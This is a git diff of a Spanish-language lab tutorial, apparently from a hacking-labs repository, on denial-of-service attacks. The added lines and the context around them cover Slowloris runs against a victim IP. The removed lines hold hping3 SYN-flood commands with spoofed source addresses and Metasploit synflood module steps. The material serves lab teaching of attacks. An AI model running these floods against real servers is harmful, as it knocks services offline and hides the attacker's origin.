@@ -100,6 +100,14 @@ service apache2 status
 ```
 </b>
 
+<p align="center">
+<picture>
+  <source media="(prefers-color-scheme: dark)" srcset="images/HTTP_Flood_5.png">
+  <source media="(prefers-color-scheme: light)" srcset="images/HTTP_Flood_5.png">
+  <img alt="Hacking_Labs, más allá de la Ciberseguridad" src="images/HTTP_Flood_5.png" width="50%">
+</picture>
+</p>
+
 - <b>Paso 3</b>: Ahora podemos realizar un ataque muy sencillo de tipo DDoS con el comando:
 <b>
 
@@ -108,7 +116,24 @@ python3 slowloris.py [ip_victima] -s 500
 ```
 </b>
 
-- Entre los diversos modificadores, se pueden elegir:
+<p align="center">
+<picture>
+  <source media="(prefers-color-scheme: dark)" srcset="images/HTTP_Flood_7.png">
+  <source media="(prefers-color-scheme: light)" srcset="images/HTTP_Flood_7.png">
+  <img alt="Hacking_Labs, más allá de la Ciberseguridad" src="images/HTTP_Flood_7.png" width="50%">
+</picture>
+</p>
+
+- <b>Paso 4</b>: Poco a poco se irá comprobando que el resultado está produciéndose en tiempo real en la VM. Además, podemos introducir multitud de modificadores al script de SlowLoris, lo que potenciará nuestro ataques:
+
+<p align="center">
+<picture>
+  <source media="(prefers-color-scheme: dark)" srcset="images/HTTP_Flood_6.png">
+  <source media="(prefers-color-scheme: light)" srcset="images/HTTP_Flood_6.png">
+  <img alt="Hacking_Labs, más allá de la Ciberseguridad" src="images/HTTP_Flood_6.png" width="50%">
+</picture>
+</p>
+
   - <b>-p</b>: puerto del webserver, puerto 80 por defecto
   - <b>-s</b>: número de sockets creados para usar en el test
   - <b>-v</b>: aumenta la información en la salida (terminal de Kali Linux)
@@ -116,125 +141,3 @@ python3 slowloris.py [ip_victima] -s 500
   - <b>-x</b>: utiliza proxy de tipo SOCK5 para la conexión
   - <b>-https</b>: utiliza el protocolo HTTPS para cada petición
   - <b>-sleeptime</b>: tiempo de "descanso" entre envíos
-
-
-------------------------------------------------------------------------------
-
-
-
-
-
-Se puede comprobar que <b>-p</b> es utilizado para determinar el puerto, que <b>-S</b> activa la flag SYN del paquete TCP-IP, y que <b>--flood</b> indica que el envío de paquetes se realizará de la manera más rápida posible. Además, podemos encubrir el origen con múltiples variantes
-
-<b>
-
-```
-hping3 -a [ip_atacante_falsa] -p 80  -S --flood [ip_victima] # IP de origen encubierta
-```
-</b>
-
-<b>
-
-```
-hping3 --rand-source -p 80  -S --flood [ip_victima] # IP de origen generada aleatoriamente
-```
-</b>
-
-<b>
-```
-hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.1.47
-```
-</b>
-Podemos comprobar que las variables <b>-c</b> determina la cantidad de paquetes que se enviarán, que <b>-S</b> activa la flag SYN del paquete TCP-IP, que <b>-p</b> es utilizado para determinar el puerto al que realizar el ataque, <b>-d</b> determina el tamaño de los paquetes que se envían y que <b>-w</b> sirve para mostrar las respuestas Windows.
-
-<p align="center">
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="images/TCPSyn_4.png">
-  <source media="(prefers-color-scheme: light)" srcset="images/TCPSyn_4.png">
-  <img alt="Hacking_Labs, más allá de la Ciberseguridad" src="images/TCPSyn_4.png">
-</picture>
-</p>
-
-> ### Trabajando con SYNFlood: METASPLOIT SynFlood :computer:
-> <b>SynFlood</b> es una de las herramientas auxiliares disponibles en el <b>Framework Metasploit</b> donde, de nuevo, la herramienta se aprovecha de un fallo en la forma en que la mayoría de los hosts tienen implementado el handshake TCP de tres vías.
-> Veamos la realización del ataque SYN Flooding:
-
-- <b>Paso 1</b>: En la shell (con privilegios de administrador), arrancamos PostGreSQL:
-<b>
-
-```
-service postgresql start
-```
-</b>
-
-- <b>Paso 2</b>: Posteriormente, cargamos el Framework Metasploit con ayuda del comando:
-<b>
-
-```
-msfconsole
-```
-</b>
-
-<p align="center">
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="images/TCPSyn_5.png">
-  <source media="(prefers-color-scheme: light)" srcset="images/TCPSyn_5.png">
-  <img alt="Hacking_Labs, más allá de la Ciberseguridad" src="images/TCPSyn_5.png">
-</picture>
-</p>
-
-- <b>Paso 3</b>: Ya en el Framework Metasploit, nos disponemos a cargar la herramienta auxiliar con ayuda del comando:
-<b>
-
-```
-use auxiliary/dos/tcp/synflood
-```
-</b>
-
-- <b>Paso 4</b>: Gracias al comando que mostramos a continuación, podemos configurar la IP de la víctima:
-<b>
-
-```
-set RHOST [ip_victima]
-```
-</b>
-
-<p align="center">
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="images/TCPSyn_6.png">
-  <source media="(prefers-color-scheme: light)" srcset="images/TCPSyn_6.png">
-  <img alt="Hacking_Labs, más allá de la Ciberseguridad" src="images/TCPSyn_6.png">
-</picture>
-</p>
-
-Podemos comprobar si está o no configurado mediante:
-<b>
-
-```
-show options
-```
-</b>
-
-<p align="center">
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="images/TCPSyn_7.png">
-  <source media="(prefers-color-scheme: light)" srcset="images/TCPSyn_7.png">
-  <img alt="Hacking_Labs, más allá de la Ciberseguridad" src="images/TCPSyn_7.png">
-</picture>
-</p>
-
-- <b>Paso 5</b>: Ya podemos realizar el ataque SYN Flood sin problema:
-<b>
-
-```
-Exploit
-```
-</b>
-
-<p align="center">
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="images/TCPSyn_8.png">
-  <source media="(prefers-color-scheme: light)" srcset="images/TCPSyn_8.png">
-  <img alt="Hacking_Labs, más allá de la Ciberseguridad" src="images/TCPSyn_8.png">
-</picture>
-</p>
